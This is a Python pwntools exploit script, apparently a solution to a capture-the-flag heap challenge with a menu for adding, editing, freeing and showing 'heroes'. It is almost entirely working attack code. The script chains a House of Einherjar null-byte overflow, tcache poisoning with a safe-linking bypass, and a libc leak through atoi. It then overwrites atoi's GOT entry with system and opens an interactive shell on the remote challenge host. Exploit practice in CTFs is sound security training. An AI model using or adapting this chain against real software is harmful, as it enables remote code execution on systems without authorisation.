#!/usr/bin/env python3

from pwn import *

# ----------- Configuration ------------

# Configure accordingly
BINARY = './main'
HOST, PORT = 'localhost', 1337
LIBC = None#'./libc.so.6'
LD   = None#'./ld-linux-x86-64.so.2'
#LIBC = './libc.so.6'
#LD   = './ld-linux-x86-64.so.2'

# Pwntools context
context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']
context.aslr = None

# Load binaries
elf  = ELF(BINARY)
libc = ELF(LIBC) if LIBC else None

# Breakpoints
gdb_breakpoints=[]

# GDB init commands
gdb_commands=[]


# ----------- Helpers ------------

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split(b'-')[0], 16)


# ----------- Launchers ------------

def make_gdbscript(p=None):
    script = "handle SIGALRM ignore\n"

    base = 0

    # PIE case (TODO fix this)
    #if p is not None:
    #    base = get_base_address(p)
    #    script += "set $_base = 0x{:x}\n".format(base)

    for bp in gdb_breakpoints:
        script += "b *0x%x\n"%(base + bp)

    for line in gdb_commands:
        script += f"{line}\n"

    return script

def gdb_attach(p):
    return gdb.attach(p, gdbscript=make_gdbscript(p=p))

def run_debug(binary, libc=None, ld=None):
    args = []
    kwargs = {}
    if libc:
        log.info('Running preloading libc "%s"' % libc)
        if ld:
            args.append(ld)
        else:
            log.warn('Using custom libc, however no loader provided. This may cause a crash')
        kwargs['env'] = {'LD_PRELOAD': libc}

    args.append(binary)
    kwargs["gdbscript"] = make_gdbscript()
    return gdb.debug(args, **kwargs)

def run_plain(binary, libc=None, ld=None):
    args = []
    kwargs = {}
    if libc:
        log.info('Running preloading libc "%s"' % libc)
        if ld:
            args.append(ld)
        else:
            log.warn('Using custom libc, however no loader provided. This may cause a crash')
        kwargs['env'] = {'LD_PRELOAD': libc}

    args.append(binary)
    #return process(args, **kwargs,)
    #return process(args, **kwargs, stdout=process.PTY)
    return process(args, **kwargs, stdout=process.PTY, stdin=process.PTY)

def start():
    if args.REMOTE:
        log.info("REMOTE PROCESS")
        HOST, PORT = 'blackhat4-52ae12a60181c296037024a91e88c613-0.chals.bh.ctf.sa', 443                                                                                                      
        return remote(HOST, PORT, ssl=True, sni=HOST)
        return remote(HOST, PORT)

    elif args.DBG or args.DEBUG:
        log.info("LOCAL PROCESS (DEBUG)")
        return run_debug(BINARY, libc=LIBC, ld=LD)

    else:
        log.info("LOCAL PROCESS")
        return run_plain(BINARY, libc=LIBC, ld=LD)

# ----------- Functions -------------

#def new_hero(size):
#    p.sendlineafter(b'>', b'1')
#    p.sendline(str(size).encode())
#    o = p.recvuntil(b'1- Add hero to class', drop=True)
#    log.info(o)
#    m = re.search(r'You got new hero at chair (\d+) @ with location (.*)$', o.decode('utf-8'))
#    return int(m.group(1)), int(m.group(2), 16)
#
#def edit_skill(idx, desc):
#    p.sendlineafter(b'>', b'2')
#    p.sendlineafter(b'index:', str(idx).encode())
#    #log.info(p.recvuntil(b"skill:"))
#    log.info((desc).hex())
#    log.info(hex(len(desc)))
#    p.sendafter(b"skill:", desc)
#
#def kick_hero(idx):
#    p.sendlineafter(b'>', b'3')
#    p.sendlineafter(b"index:", str(idx).encode())
#
#def show_hero(idx):
#    p.sendlineafter(b'>', b'4')
#    p.sendlineafter(b'index:', str(idx).encode())
#    p.recvuntil(b"description:")
#    o = p.rcvuntil(b'1- Add hero to class', drop=True)
#    return o[1:]

def pad(msg,sz, p=b'\0'):
    return msg + p*(sz-len(msg))

def new_hero(size):
    p.sendafter(b'>', pad(b'1',4))
    p.sendafter(b'size:',pad(str(size).encode(),0x14))
    o = p.recvuntil(b'1- Add hero to class', drop=True)
    log.info(o)
    m = re.search(r'You got new hero at chair (\d+) @ with location (.*)$', o.decode('utf-8'))
    return int(m.group(1)), int(m.group(2), 16)

def edit_skill(idx, desc):
    log.info(f"Edit skill: {idx}")
    p.sendafter(b'>', pad(b'2',4))
    p.sendafter(b'index:', pad(str(idx).encode(),4))
    #log.info(p.recvuntil(b"skill:"))
    log.info((desc).hex())
    log.info(hex(len(desc)))
    p.sendafter(b"skill:", desc)

def kick_hero(idx):
    log.info(f"Kick: {idx}")
    p.sendafter(b'>', pad(b'3',4))
    p.sendafter(b"index:", pad(str(idx).encode(),4))

def show_hero(idx):
    p.sendafter(b'>', pad(b'4',4))
    p.sendafter(b"index:", pad(str(idx).encode(),4))
    p.recvuntil(b"description:")
    o = p.recvuntil(b'1- Add hero to class', drop=True)
    return o[1:]


# ----------- Main Logic ------------

# Define GDB breakpoints before starting
# gdb_breakpoints.append(0x0040066a)

# Define any extra GDB command to be executed
# (this is exec after breakpoints are set)
#gdb_commands.append("continue")

# Launch the process
p = start()

# Uncomment this for attaching a debugger
#gdb_attach(p)

# https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_einherjar.c


# a
idx, addr_a = new_hero(0x38)
log.info(f"A: {idx} {addr_a:x}")

# create fake chunk
# pad to sz-1 to avoid overflow
edit_skill(idx, pad(p64(0)+p64(0x60)+p64(addr_a)+p64(addr_a), 0x38))

# b
b_sz = 0x28
idx_b, addr_b = new_hero(b_sz)
log.info(f"B: {idx_b} {addr_b:x}")
usable_size = b_sz # TODO round
assert(usable_size, b_sz)

# c
idx_c, addr_c = new_hero(0xf8)
log.info(f"C: {idx_c} {addr_c:x}")

# null byte overflow + new prev_size
payload = b'A'*(b_sz-8)+p64(0x60)
edit_skill(idx_b, payload)

# fill t-cache
log.info("Filling t-cache")

tc = []
for _ in range(7):
    idx, addr = new_hero(0xf8)
    tc.append((idx, addr))
    log.info(f"new: {idx} {addr:x}")


log.info("Filling t-cache list")
for idx, addr in tc:
    kick_hero(idx)

# Free C - consolidate w/ fake B
kick_hero(idx_c)

# Overlapping chunk
idx_d, addr_d = new_hero(0x158)
log.info(f"D: {idx_d} {addr_d:x}")

# Pad
idx_pad, addr_pad = new_hero(0x28)
kick_hero(idx_pad)


# T-cache poisoning
log.info("Poisoning")
kick_hero(idx_b)


#payload = b'A'*8*4 + p64(0) + p64(31) + p64(target ^ ((addr_d+6) >> 12))
#payload = b'A'*8*7 + p64(target ^ ((addr_d+6) >> 12))
target = 0x00601490
payload = p64(0x602) + p64(0)*4 + p64(0x31) + p64(target ^ ((addr_d) >> 12)) * 2
edit_skill(idx_d, pad(payload,0x158))
#p.interactive()

e_sz = 0x28
new_hero(e_sz)
idx_e, addr_e = new_hero(e_sz)
log.info(f"E: {idx_e} {addr_e:x}")

#
e = show_hero(idx_e)
atoi = u64(e[:8])
log.info(f"Atoi {hex(atoi)} {e.hex()}")


libc = ELF("/usr/lib/libc.so.6")
#libc = ELF("libc.so.6")
libc_atoi = libc.symbols["atoi"]
libc_system = libc.symbols["system"]
off = libc_system - libc_atoi
log.info(f"Libc atoi {hex(libc_atoi)}")
log.info(f"Libc system {hex(libc_system)}")
log.info(f"Off {hex(off)}")

payload = p64(atoi + off)
edit_skill(idx_e, pad(payload,e_sz))


# Profit
p.interactive()

